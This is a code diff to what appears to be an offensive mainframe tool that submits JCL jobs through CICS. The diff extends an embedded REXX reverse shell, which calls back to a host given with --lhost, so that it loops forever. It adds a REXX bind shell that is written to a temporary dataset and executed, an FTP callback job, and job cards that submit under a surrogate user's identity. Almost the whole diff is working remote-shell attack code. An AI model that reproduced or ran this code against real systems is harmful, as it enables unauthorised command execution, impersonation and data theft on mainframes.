@@ -858,8 +858,10 @@ def reverse_jcl(lhost, username="CICSUSEB"):
   """
   job_name = username
   tmp = rand_name(randrange(3,7))
+  whine('Payload set to reverse tso to '+lhost,'info')     
   
   if results.surrogat_user:
+      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
       job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
   else:
       job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'      
@@ -880,25 +882,19 @@ def reverse_jcl(lhost, username="CICSUSEB"):
     t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
     t=SOCKET('SOCKETSETSTATUS','CLIENT');
     t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'Shell> ')
-  DO until i=3
-    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);i=i+1;end;exit
+  DO FOREVER
+    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;exit
  get_cmd:
-    parse arg socket_to_use; sox = SOCKET('RECV',socket_to_use,10000);
-    parse var sox s_rc s_data_len s_data_text;
-    c = DELSTR(s_data_text,LENGTH(s_data_text));return c;
+ parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
+ parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
   INLIST: procedure
-    arg sock, socklist; do i=1 to words(socklist)
-    if words(socklist) = 0 then return 0
-    if sock = word(socklist,i) then return 1;end;return 0
+    arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
+    if sock = word(s,i) then return 1;end;return 0
  exec_tso:
-   parse arg tso_do; text = nl||'Issuing TSO Command: '||tso_do||nl
-   u = OUTTRAP('tso_out.'); ADDRESS TSO tso_do;
-   u = OUTTRAP(OFF);DO i = 1 to tso_out.0
-      text = text||tso_out.i||nl;end;return text
+ parse arg tso_do; text = '';u = OUTTRAP('out.'); ADDRESS TSO tso_do;
+ u = OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
  exec_cmd:
- parse arg sockID, do_it; parse var do_it do_it do_co
- if translate(do_it) = 'TSO' THEN do
-   t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
+ parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
@@ -913,12 +909,20 @@ def reverse_jcl(lhost, username="CICSUSEB"):
   
   return jcl_code
 
-def ftp_jcl(lhost):
+def ftp_jcl(lhost, job_name="FTPCICS"):
   """
      JOB that initiates an FTP connection from the mainframe to your FTP server
      
   """
   cmds = ""
+  whine('Payload set to reverse FTP to '+lhost,'info')     
+  
+  if results.surrogat_user:
+      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
+      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
+  else:
+      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'
+      
   if not results.ftp_cmds:
       whine('Please point towards a valid ftp file containing commands to send','err');
       sys.exit();
@@ -928,12 +932,14 @@ def ftp_jcl(lhost):
       sys.exit();
   
   whine('Reading FTP commands from '+results.ftp_cmds,'info')
+  
   for line in cmds_file:
      if line.find("#") != 0:
         cmds +=" "+line
   
-  job_name = 'FTPCICS'
   tmp = rand_name(randrange(3,7))  	
+  
+  
   
   jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
 //FTPSTP1  EXEC PGM=FTP,REGION=2048K,
@@ -945,6 +951,85 @@ def ftp_jcl(lhost):
 """
   return jcl_code
 
+def memory_rexx(lhost):
+  """
+     JOB that fetches REXX script from remote host and executes in memory
+     TODO: make it work....
+  """
+  cmds = "";
+  if not results.rexx_file:
+      whine('Please point towards a valid REXX file','err');
+      sys.exit();
+  rexx_file = open(results.rexx_file,'r')
+  if not rexx_file:
+      whine('Could not open REXX file '+results.rexx_file,'err');
+      sys.exit();
+  
+  for line in rexx_file:
+     cmds +=line.strip() + ";"
+  
+def direct_jcl(port, job_name="CICSUSEB"):
+  """
+     JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
+     then executes said file
+  """
+  tmp = rand_name(randrange(4,7))
+  if not port:
+      port = '4445'
+  whine('Payload set to bind tso at port'+port,'info')     
+  if results.surrogat_user:
+      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
+      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
+  else:
+      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'      
+  
+  jcl_code = job_card+"""
+//CREATERX  EXEC PGM=IEBGENER
+//SYSPRINT   DD SYSOUT=*
+//SYSIN      DD DUMMY
+//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
+//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
+//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT1     DD *
+ /* REXX */;nl ='25'x
+ te = socket('INITIALIZE','DAEMON',2);te = Socket('GetHostId')
+ parse var te s_rc MF_IP .;te = SOCKET('SOCKET');parse var te s_rc s_id .
+    te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
+ te=Socket('BIND',s_id,'AF_INET' '"""+port+"""' MF_IP);te=Socket('Listen',s_id,2)
+    cl = '';DO k=1 to 5
+    te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
+    parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
+  IF INLIST(s_id,readin) then do;te = Socket('Accept',s_id)
+     parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
+     te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON')
+     te = SOCKET('SEND',c_s, 'Shell> ');END    
+    if readin = c_s then do;cmd_g = get_cmd(c_s)
+     parse = exec_cmd(c_s,cmd_g);end;end;exit
+ get_cmd:
+  parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
+  parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
+ INLIST: procedure
+  arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
+  if sock = word(s,i) then return 1;end;return 0
+ exec_cmd:
+  parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
+  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
+ exec_tso:
+  parse arg tso_do; text = '';u = OUTTRAP('out.'); ADDRESS TSO tso_do;
+  u=OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
+
+/*
+//SYSOUT     DD SYSOUT=*
+//STEP01 EXEC  PGM=IKJEFT01
+//SYSTSPRT DD  SYSOUT=*
+//SYSTSIN  DD *
+ EX 'CICSUSER."""+tmp+"""'
+/*
+//SYSIN    DD  DUMMY
+/*EOF
+"""
+  return jcl_code  
+  
 def set_mixedCase():
     """
         Set the terminal to mixed case in case the JCL submitted containes OMVS code
@@ -1140,7 +1225,7 @@ def close_spool():
             whine('Problem submitting the spool','err')
             whine(data[22],'err')
             return False
-    whine('JOB submitted successfully to JES. Might take a few seconds to connect back','good',1)
+    whine('JOB submitted successfully to JES. Might take a few seconds to execute','good',1)
     
 def check_tdqueue():
     """
@@ -1253,6 +1338,8 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         jcl = dummy_jcl(lhost);
     elif kind=="reverse":
         jcl = reverse_jcl(lhost)
+    elif kind=="direct":
+        jcl = direct_jcl(results.port)
     elif kind=="ftp":
         jcl = ftp_jcl(lhost)
     
@@ -1360,7 +1447,7 @@ def main(results):
     global DO_AUTHENT
     global AUTHENTICATED
 
-    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
+    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl and (results.submit !="direct")):
         whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
         sys.exit();      
 
@@ -1515,6 +1602,7 @@ if __name__ == "__main__" :
     parser.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
 
     parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
+    parser.add_argument('--port',help='Remote port to open for bind shell in REXX',dest='port')
     parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
 
     results = parser.parse_args()
